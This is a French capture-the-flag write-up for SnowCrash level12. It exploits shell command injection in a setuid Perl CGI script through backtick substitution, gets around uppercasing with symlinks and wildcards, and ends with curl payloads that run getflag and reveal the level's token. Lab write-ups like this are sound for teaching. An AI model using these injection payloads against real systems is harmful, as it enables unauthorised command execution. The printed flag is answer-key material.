# Explication

### Update :

Finalement une solution bien plus simple est de creer un fichier `tmp/MY_SCRIPT` dans lequel on met `getflag > tmp/MY_SCRIPT` possedant tout les droits et d'envoyer simplement dans les `backticks` en faisant la substitution la shell va simplement faire la commande presente dans le fichier et donc envoyer le flag dans `tmp/MY_SCRIPT` c'est bien plus simple.



---

Un `ls -l` nous montre un script Perl :

```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```Perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

En observant rapidement le script il est similaire a un precedent niveau, c'est un script qui est execute par un serveur web qui prend 2 arguments `"x"` et `"y"`, on remarque a nouveau l'utilisation de `backticks` qui permet au script d'executer un shell.

La ou c'est dangereux a nouveau c'est que ce script se lance avec les droits `suid` de `flag12` et que le shell execute dans le script utilise une variable utilisateur que nous fournissons (il s'agit ici de `"x"` qui est mis dans la variable `$xx`).

`$xx` passe par 2 choses avant d'arriver dans les `backticks` :

- `$xx =~ tr/a-z/A-Z/` -> va convertir les characters de la chaine entre 'a-z' vers 'A-Z' donc minuscule vers majuscule.
- `$xx =~ s/\s.*//` -> cela signifie que tout ce qui est derriere un espace sera supprime.

Ces 2 operations vont ajouter un peu de securite mais ce ne sera pas suffisant.

`` @output = `egrep "^$xx" /tmp/xd 2>&1` `` c'est ici que la faille va etre situee, note input se retrouvera apres transformation dans une execution shell , entre `double quotes`. La fonction fait egrep de notre input sur un fichier /tmp/xd et redirige les erreurs vers stdout.

Il ne semble pas y avoir grand chose a faire avec cette fonction en particulier car la suite du programme va simplement terminer par afficher des . ou ..

L'idee va etre donc de faire une autre commande avant egrep comme on l'avait fait dans d'autres levels, on va utiliser la mechanique de subsitution pour executer nos commandes shells et leur sortie sera utiliser par egrep.

## Avant toute chose il faut deja bien visualiser ou vont etre les sorties des commandes shell:

### Cas 1
- La commande base `` @output = `egrep "^$xx" /tmp/xd 2>&1` `` va avoir sa sortie et egalement ses erreurs qui vont ressortir dans le script qui sera ensuite utilise pour renvoyer `.` ou `..`

### Cas 2
Si j'essaye d'exploiter l'utilisation des `backticks` pour faire de la substitution avec quelque chose comme ceci : `` http://localhost:4646/?x='`ls`' ``

alors je me retrouverai avec ceci dans le script : `` @output = `egrep "^`LS`" /tmp/xd 2>&1` `` , mon `ls` devient `LS` et mes `backticks` sont conserves.

- Ma commande `LS` va utiliser la substitution et son retour deviendra un argument pour `egrep` , j'aurai bien cependant execute `LS` auparavant donc c'est ce que l'on voudra faire avec `getflag`. Ensuite le retour se fera pareil que dans le cas 1

On sait ou la sortie de `LS` va se faire si elle reussie (elle se retrouve en parametre de egrep) mais si elle echoue elle ne sera pas capturee dans la substitution. En cherchant un peu on comprend que en cas d'erreurs sur ce serveur web (apache) les erreurs seront logs dans un fichier `error.log` , ici il se trouve dans `/var/log/apache2/error.log`.

Si on rergarde ce fichier :

```sh
level12@SnowCrash:~$ cat /var/log/apache2/error.log
[Sat Jan 10 18:05:05 2026] [error] [client 127.0.0.1] sh: 1: LS: not found
```

L'erreur qui s'est produite dans le shell semble etre remontre dans les logs d'erreurs du serveur.

Pourquoi ? C'est assez fourbe car on pourrai s'imaginer que a cause de `` @output = `egrep "^$xx" /tmp/xd 2>&1` `` les erreurs sont redirigees vers la `stdout` mais ce n'est valable que pour les erreurs de `egrep` pas celle de la substitution.

## Commencer a exploiter
Maintenant que l'on peut voir les erreurs lies a notre substitution cela va nous faciliter la tache pour exploiter et avancer petit a petit. On remarque ducoup que `LS` ne fonctionne pas car ecrit en majuscule.

### Etape 1 : Bypass les majuscules
On ne peut donc pas passer de mots en parametre de `x` sans que cela ne soit transforme en majuscules, donc il faut trouver un moyen de contourner cela.

Un mechanisme que l'on commence a connaitre est d'utiliser des `symlinks` , essayons de faire `ln -s /bin/ls /tmp/LS` :

```sh
level12@SnowCrash:~$ ln -s /bin/ls /tmp/LS
level12@SnowCrash:~$ /tmp/LS                                                                  level12.pl
```

Parfait, le lien fonctionne et appel bien le binaire comme prevu mais il reste un probleme : je ne pourrais pas envoyer `` http://localhost:4646/?x='`/tmp/LS`' `` sans que `/tmp/LS` ne devienne lui aussi `/TMP/LS`.
Il nous faut donc voir si existe un moyen d'appeler ce fichier sans fournir le path exact. Et c'est possible avec des `wildcards` , si je fais `/*/LS` le shell va chercher tout les fichiers s'appelant `LS` qui sont directement dans un dossier (exemple qui marche : `/tmp/LS` , `/var/LS`, `/bin/ls` et ce qui marcherai pas : `/tmp/sous-dossier/LS`) et remplacera la wildcard par le vrai path donc ici `/tmp/LS`

Essayons dans notre shell :

```sh
level12@SnowCrash:~$ /*/LS
level12.pl
```

Cela fonctionne, et maintenant dans la requete HTTP :
```sh
level12@SnowCrash:~$ curl http://localhost:4646/?x='`/*/LS`'
```

en regardant les logs d'Apache `cat /var/log/apache2/error.log` on ne verra aucune nouvelle erreur ce qui sous entend que notre commande a surement marche. Cependant on ne peut voir le resultat nul part car ducoup le retour de `ls` est utilise en argument de `egrep` qui est ensuite utilise pour nous print des `.` ou `..`

### Etape 2 : Rediriger la sortie

L'idee va etre de rediriger la sortie de notre `ls` avant la substitution avec quelque chose comme `/*/LS > /tmp/my_output`

Mais toujours a cause de ce probleme de majuscule il nous refaire la meme chose que pour `ls` avec le wildcard, notre fichier s'appelera donc `/tmp/MY_OUTPUT` et on y fera reference via `/*/MY_OUTPUT`

```sh
level12@SnowCrash:~$ echo "test" > /tmp/MY_OUTPUT
level12@SnowCrash:~$ cat /*/MY_OUTPUT
test
```

Ok maintenant on test dans notre shell en faisant
(J'ai volontairement pas mis d'espace car dans le script tout ce qui est derriere un espace est supprime) :
```sh
level12@SnowCrash:~$ /*/LS>/*/MY_OUTPUT
level12@SnowCrash:~$ cat /*/MY_OUTPUT
level12.pl
```

Ok parfait il nous reste donc a envoyer ceci en parametre et la sortie de `ls` sera envoyee dans `/tmp/MY_OUTPUT` avant la substitution (qui elle recevera une sortie vide ducoup).

```sh
level12@SnowCrash:~$ curl http://localhost:4646/?x='`/*/LS>/*/MY_OUTPUT`'
..level12@SnowCrash:~$
```

Si maintenant on essaye de regarder dans `tmp/MY_OUTPUT` on ne vera pourtant pas la sortie de `ls`, alors regardons si on a eu une erreur grace au log d'apache :

```sh
cat /var/log/apache2/error.log
[Sat Jan 10 18:59:14 2026] [error] [client 127.0.0.1] sh: 1: cannot create /*/MY_OUTPUT: Directory nonexistent
```

Etrange, le shell a essaye de creer le fichier mais ducoup n'y parvient pas a cause de la wildcard. Notre fichier existe pourtant bien (EXPLIQUER POURQUOI).

C'est embetant mais si on y pense pourquoi ne pas tout simplement rediriger notre sortie vers `stderr` comme ca elle se retrouverai dans les logs d'apache (et eux on sait que ca fonctionne).

Notre requete va maintenant ressembler a :

```sh
level12@SnowCrash:~$ curl http://localhost:4646/?x='`/*/LS>&2`'
.level12@SnowCrash:~$
```

On regarde maintenant les logs d'apache et on ne voit pas la sortie de `ls` mais une erreur :
```sh
[Sat Jan 10 19:09:32 2026] [error] [client 127.0.0.1] sh: 1: Syntax error: EOF in backquote substitution
```

Il semble que le parsing de notre requete pose probleme , surement a cause de `&` dans les query params.
Pour s'assurer que ce que nous envoyons en parametre est bien interpreter on va encoder l'url (https://www.urlencoder.org/)

```sh
level12@SnowCrash:~$ curl http://localhost:4646/?x='`%2F%2A%2FLS%3E%262`'
level12@SnowCrash:~$ cat /var/log/apache2/error.log
[Sat Jan 10 19:15:53 2026] [error] [client 127.0.0.1] level12.pl
```

Parfait on voit bien que cela a fonctionner et le retour est bien rediriger vers les logs erreurs d'Apache.

### Etape 3 : Utiliser `getflag`

Il ne nous reste plus qu'a remplacer `ls` par `getflag` et de refaire la meme chose :

```sh
level12@SnowCrash:~$ ln -s /bin/getflag /tmp/GETFLAG
level12@SnowCrash:~$ curl http://localhost:4646/?x='`%2F%2A%2FGETFLAG%3E%262`' #/*/GETFLAG>&2 encoder-URL
level12@SnowCrash:~$ cat /var/log/apache2/error.log
[Sat Jan 10 19:23:39 2026] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
